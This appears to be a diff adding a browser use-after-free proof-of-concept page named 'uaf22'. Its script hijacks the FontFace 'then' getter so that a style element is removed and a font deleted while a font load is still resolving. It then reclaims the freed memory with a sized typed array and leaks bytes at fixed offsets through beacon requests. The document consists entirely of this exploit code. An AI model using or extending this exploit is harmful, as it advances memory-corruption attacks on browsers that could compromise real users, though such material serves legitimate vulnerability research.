@@ -1,0 +1,35 @@
+<!doctype html><meta charset="utf-8"><title>uaf22</title><body><script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+function hex8(u,o){var s='';for(var i=0;i<8;i++){s+=('0'+u[o+i].toString(16)).slice(-2)}return s}
+var styleEl=null, firedHere=false;
+function setup(){
+  var A=new FontFace('n0','local(Helvetica)',{unicodeRange:'U+0041'});
+  document.fonts.add(A); void A.loaded; window.__alive=[A];
+  styleEl=document.createElement('style');
+  styleEl.textContent="@font-face { font-family: q0; src: local(Arial); unicode-range: U+0042; }";
+  document.head.appendChild(styleEl);
+  b('U22-SETUP');
+  firedHere=false;
+  Object.defineProperty(FontFace.prototype,'then',{
+    configurable:true,
+    get:function(){
+      if (firedHere) return undefined;
+      firedHere=true;
+      if (styleEl) styleEl.remove();
+      try { document.fonts.delete(this); } catch(e){}
+      document.body.offsetHeight;
+      window.__one = new Uint8Array(192);
+      b('U22-ONE-ALLOC');
+      try { document.fonts.check('1em q0'); } catch(e){}
+      b('U22-CHECK-SURVIVED-0:'+hex8(window.__one,0)+'-58:'+hex8(window.__one,0x58)+'-68:'+hex8(window.__one,0x68));
+      return undefined;
+    },
+    set:function(){}
+  });
+  b('U22-LOAD-CALLED');
+  document.fonts.load('1em n0, q0','AB').then(function(){ b('U22-RESOLVED'); }, function(){ b('U22-REJECTED'); });
+}
+function run(){ b('U22-PARSE'); setup(); }
+if (document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
+else document.addEventListener('DOMContentLoaded',run);
+</script></body>
